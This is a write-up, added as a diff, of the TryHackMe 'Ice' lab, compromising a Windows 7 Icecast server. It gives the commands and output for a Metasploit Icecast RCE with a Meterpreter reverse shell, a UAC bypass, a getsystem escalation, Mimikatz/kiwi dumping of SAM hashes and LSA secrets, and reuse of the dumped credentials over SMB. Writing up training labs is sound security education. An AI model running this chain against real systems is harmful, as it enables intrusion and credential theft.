@@ -1,0 +1,311 @@
+---
+layout: writeup
+lang: en
+permalink: /en/writeups/ice/
+title: "Ice"
+ref: ice
+date: 2026-08-01
+bare: true
+platform: THM
+os: Windows 7 Professional
+difficulty: Easy
+series: thm-windows
+tags: [win, icecast, rce, meterpreter, uac-bypass, mimikatz]
+txt: /writeups-files/ice.txt
+summary: "RCE on Icecast, UAC bypass to reach SYSTEM, dump of SAM and LSA secrets with kiwi."
+---
+
+# Writeup — Ice (TryHackMe)
+
+OS: Windows 7 Professional
+Difficulty: Easy
+Date: 22–25 August 2026
+
+---
+
+## Summary
+
+Standalone Windows machine. full port scan reveals SMB, RDP and an anomalous port 8000 that turns out to be an Icecast audio streaming server. No version recoverable through the banner or known endpoints, only the generic confirmation of Icecast 2.x from /status.xsl found with gobuster. The SMB lead with guest access doesn't get to any visible share. The only remaining vector is the Metasploit exploit for Icecast header overwrite, which fails repeatedly until you discover that port 8000 on the assigned machine was closing itself with no precise reason. 
+After a restart of the lab machine the exploit works and produces a Meterpreter session as the local user, UAC bypass to get to NT SYSTEM with elevated privileges, dump of SAM and LSA secrets with kiwi, credential reuse over SMB and a final confirmation of maximum privileges by reading Icecast's configuration on disk.
+
+Chain followed: nmap full port → Icecast on 8000 → no version recoverable → SMB guest with no useful shares → Metasploit icecast_header fails on an instance where the service isn't up → machine restart → RCE successful → Meterpreter local user → UAC bypass → SYSTEM → credential dump → SMB login with dumped credentials → reading icecast.xml and every other file.
+
+---
+
+## additional tools and methodology
+
+an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck, detailed explanation of technical concepts and correcting syntax in long commands. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.
+
+---
+
+## Preface
+
+room done partly on the TryHackMe AttackBox and partly on my local machine, switching from one to the other whenever the local pc started slowing down too much during the repeated exploit attempts. 
+the longest phase wasn't technical but pure deadlock: the Metasploit exploit against Icecast kept failing in exactly the same way, and only after many attempts on different IPs did it become clear that the problem wasn't the syntax but the target machine itself, which on some spawns started with the Icecast service listening on port 8000 but then closed it shortly after. 
+much of the post-exploitation phase, in particular getsystem through UAC bypass and the use of the kiwi extension for credential dumping, are steps I didn't know and had never covered academically, and I followed them leaning on the instructions of the room's official walkthrough, without which I wouldn't have known how to proceed from a session with limited privileges.
+
+---
+
+## Phase 1 — Reconnaissance
+
+The room explicitly suggests a SYN scan on all ports:
+
+sudo nmap -Pn -sS -p- -T4 10.113.190.56
+
+Result:
+
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+8000/tcp  open  http-alt
+49152-49184/tcp open  unknown (various)
+
+445 and 3389 are the usual suspects on a Windows machine, typical of these challenges. what really catches the eye is 8000, which I had never noticed on similar machines. a web application exposed on that port is unusual
+
+nmap -Pn -sC -sV -p8000 10.113.190.56
+
+PORT     STATE SERVICE VERSION
+8000/tcp open  http    Icecast streaming media server
+
+doing some research, I note that Icecast is a server for audio streaming over HTTP and is named in the room introduction as a vector already exploited in the past on vulnerable versions.
+
+---
+
+## Phase 2 — Version hunting and content discovery
+
+Before thinking about the exploit the exact version is needed for metasploit. 
+curl -I on port 8000 returns no useful headers, and a targeted scan with nmap -sV on that single port adds nothing beyond what was already found. I try better-known endpoints by hand (server_version, admin) with no result,so I move to content discovery with gobuster / endpoint fuzzing:
+
+gobuster -m dir -u http://10.113.162.81:8000 -w /usr/share/dirb/wordlists/common.txt -x html,xml,xsl,txt
+
+Only useful result:
+
+/status.xsl (Status: 200)
+
+curl on the endpoint returns an HTML page titled "Icecast 2 Status", which confirms the version but not the exact build. The 2.x versions have known CVEs according to exploit-db, but to launch the correct exploit the complete build is needed (2.X.X), which here doesn't appear anywhere. I try a wider wordlist (big.txt) without finding anything else.
+
+---
+
+## Phase 3 — The SMB lead
+
+With port 8000 giving no further information, I try SMB, the only lead left even if it's counterintuitive given the machine's title and the hints about Icecast:
+
+sudo nmap -Pn -sC -sV -p139,445 10.113.129.152
+
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+smb-security-mode: account_used: guest, message signing disabled
+
+Guest access seems accepted. trying an anonymous login:
+
+smbclient -L //10.113.129.152 -N
+
+Anonymous login successful, but no share listed (SMB1 disabled -- no workgroup available). The SMB lead stays closed
+
+---
+
+## Phase 4 — Exploitation (+ failures)
+
+In Metasploit there's a single compatible module, the one the room itself suggests:
+
+exploit/windows/http/icecast_header (2004-09-28, rank great)
+
+I identify the required parameters: RHOSTS, RPORT (already 8000), and for the default payload (windows/meterpreter/reverse_tcp) LHOST and LPORT are needed. I use the VPN IP (tun1) as LHOST:
+
+msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS 10.113.129.152; set RPORT 8000; set LHOST 192.168.156.12; set LPORT 4444; run"
+
+Started reverse TCP handler...
+Exploit completed, but no session was created.
+
+No session. I retry changing payload (windows/shell_reverse_tcp) and then on a different IP of the respawned machine, but same result.
+ At this point I also have a shellcode generated specifically for icecast in Python to bypass metasploit entirely:
+
+python /tmp/exploit.py 10.113.164.135
+
+Not even this produces any connection. 
+The local pc starts slowing down a lot with all these attempts and I switch to the TryHackMe AttackBox hoping something changes. a targeted scan reveals the real problem:
+
+nmap -Pn -p8000 -sV 10.113.164.135
+8000/tcp closed http-alt
+
+Port 8000 closed on that specific instance of the machine. It isn't an exploit syntax problem, it's that the Icecast service simply doesn't start on some spawns/stops existing. 
+After several costly restarts of the lab machine from the platform, I finally find an instance with the port open:
+
+nmap -Pn -p- --open -T4 10.113.132.102
+8000/tcp open  http-alt
+
+Hours lost on an infrastructure problem of the room, not on execution. I relaunch the exploit on the new target setting the new parameters:
+
+msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS 10.113.132.102; set RPORT 8000; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.113.155.175; set LPORT 4444; run"
+
+Meterpreter session 1 opened (10.113.155.175:4444 -> 10.113.132.102:49207)
+
+Finally a meterpreter session.
+
+---
+
+## Phase 5 — Post exploitation and privilege escalation
+
+I check the current user acquired at spawn:
+
+meterpreter > getuid
+Server username: Dark-PC\Dark
+
+meterpreter > getprivs
+
+Only limited privileges (SeChangeNotifyPrivilege and similar useless ones), nothing suggesting administrative privileges. 
+I try getsystem anyway , Meterpreter's automatic privilege escalation technique which I only knew by name and had explained by forums and chatbot(it attempts named pipe impersonation and a token duplication):
+
+meterpreter > getsystem
+[-] Named Pipe Impersonation (In Memory/Admin): failed
+[-] Token Duplication (In Memory/Admin): failed
+(all available techniques fail)
+
+I try spawning a shell to gather more information about the system:
+
+meterpreter > shell
+C:\Program Files (x86)\Icecast2 Win32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+OS Name: Microsoft Windows 7 Professional
+OS Version: 6.1.7601 Service Pack 1
+System Type: x64-based PC
+
+I go back to Meterpreter and use local_exploit_suggester to figure out which exploits are applicable:
+
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+exploit/windows/local/bypassuac_eventvwr: The target is vulnerable. Likely exploitable
+
+I launch the UAC bypass as metasploit advises:
+
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+set LHOST 10.113.155.175
+run
+
+Meterpreter session 2 opened
+
+New session, but getuid still returns Dark-PC\Dark and nothing else. 
+despite this, session 2 has many more privileges enabled (SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, others). I retry getsystem on this session:
+
+sessions -C "getsystem" -i 2
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+sessions -C "getuid" -i 2
+Server username: NT AUTHORITY\SYSTEM
+
+the UAC bypass unlocked the privileges needed for Named Pipe Impersonation, which had failed before, to work.
+Now we have full privileges
+
+Escalation chain: Icecast RCE → Meterpreter local user → UAC bypass (eventvwr) → elevated privileges → Named Pipe Impersonation → SYSTEM.
+
+---
+
+## Phase 6 — Credential dump and lateral movement
+
+With SYSTEM I first try to look for the flags directly with some queries:
+
+sessions -C "search -f *flag*" -i 2
+No files matching your search were found.
+
+No flags. 
+However, checking the room walkthrough it turns out that no flags exist/are required and that to find the requested data you need a Meterpreter extension dedicated to credential dumping that I didn't know, kiwi (the integrated version of Mimikatz). I load it:
+
+meterpreter > load kiwi
+meterpreter > creds_all
+[+] Running as SYSTEM
+
+meterpreter > lsa_dump_sam
+
+RID 000001f4 (500) - Administrator: NTLM Hash 31d6cfe0d16ae931b73c59d7e0c089c0
+RID 000003e8 (1000) - Dark: NTLM Hash 7c4fe5eada682714a036e39378362bab
+
+meterpreter > lsa_dump_secrets
+
+Secret: DefaultPassword
+cur/text: Password01!
+
+Cleartext password of the user Dark recovered from the LSA secrets. I reuse it directly to authenticate over SMB:
+
+background
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 10.113.132.102
+set SMBUser Dark
+set SMBPass Password01!
+set CreateSession true
+run
+
+Success: '.\Dark:Password01!'
+SMB session 3 opened
+
+sessions -i 3
+SMB (10.113.132.102) > shares
+
+ADMIN$, C$, IPC$ — the default administrative shares, now accessible with the recovered credentials.
+
+---
+
+## Phase 7 — Final confirmation on the filesystem
+
+I go back to the SYSTEM Meterpreter session to explore the filesystem and confirm total compromise:
+
+meterpreter > cd C:\Users\Dark\Desktop
+meterpreter > ls
+
+Icecast2 Win32.lnk, icecast.exe
+
+meterpreter > search -f icecast.xml
+
+c:\Program Files (x86)\Icecast2 Win32\icecast.xml
+
+meterpreter > cat "C:\Program Files (x86)\Icecast2 Win32\icecast.xml"
+
+<source-password>hackme</source-password>
+<admin-user>admin</admin-user>
+<admin-password>hackme</admin-password>
+<listen-socket><port>8000</port></listen-socket>
+
+Complete Icecast configuration recovered, including the administrative credentials of the application itself (admin/hackme, Icecast's known default password, never changed on this installation).
+
+Before getting to icecast.xml I had browsed freely in C:\Windows\system32, listed all the profiles in C:\Users (including more reserved folders like "All Users" and "Default User"), read the entire contents of Dark's profile including NTUSER.DAT, and listed the administrative shares ADMIN$ and C$ over SMB, all actions a standard user could not perform
+
+E.g.: meterpreter > cd C:\Users\Dark
+meterpreter > ls
+Listing: C:\Users\Dark
+======================
+100666/rw-rw-rw-  524288  fil  2026-08-25 17:38:23  NTUSER.DAT
+100666/rw-rw-rw-  262144  fil  2026-08-25 17:38:23  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil  2019-11-12 22:48:31  ntuser.dat.LOG2
+etc...
+
+---
+
+## Full chain
+
+nmap full port scan → SMB, RDP, Icecast on 8000
+→ no version recoverable from banner or known endpoints
+→ gobuster finds /status.xsl → confirms only generic Icecast 2.x
+→ SMB guest accessible but with no useful shares
+→ Metasploit icecast_header fails repeatedly
+→ discovery: port 8000 closed on that spawn of the machine
+→ lab machine restart → port 8000 open
+→ RCE successful → Meterpreter Dark-PC\Dark
+→ direct getsystem fails
+→ UAC bypass (eventvwr) → privileges broadened
+→ getsystem via Named Pipe Impersonation → NT AUTHORITY\SYSTEM
+→ kiwi: SAM and LSA secrets dump → cleartext password of Dark
+→ SMB login with dumped credentials → access to administrative shares
+→ reading icecast.xml → admin credentials of the application
+
+---
+
+## Lessons learned
+
+When an exploit that should work fails always in exactly the same way on different targets, it's worth checking the real state of the service on the target before continuing to change parameters on the exploit. In this case the problem had never been mine.
+
+---
+
+## Tools used
+
+nmap, gobuster, smbclient, msfconsole (exploit/windows/http/icecast_header, exploit/windows/local/bypassuac_eventvwr, post/multi/recon/local_exploit_suggester, auxiliary/scanner/smb/smb_login), Meterpreter (kiwi)
